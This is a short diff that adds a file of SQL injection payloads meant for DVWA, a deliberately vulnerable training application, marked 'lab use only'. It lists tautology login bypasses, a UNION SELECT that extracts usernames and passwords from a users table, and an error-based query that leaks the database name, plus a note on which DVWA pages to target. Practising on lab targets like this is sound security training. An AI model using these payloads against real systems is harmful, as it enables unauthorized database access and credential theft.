@@ -1,0 +1,8 @@
+-- SQLi payloads for DVWA (lab use only)
+' OR '1'='1' --
+' OR 1=1 --
+' UNION SELECT null, user, password FROM users --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --
+' OR 'a'='a
+
+Notes: Use on DVWA -> SQL Injection (vulnerable id-based pages). DVWA's DB schema contains `user`, `password` fields for demonstration.
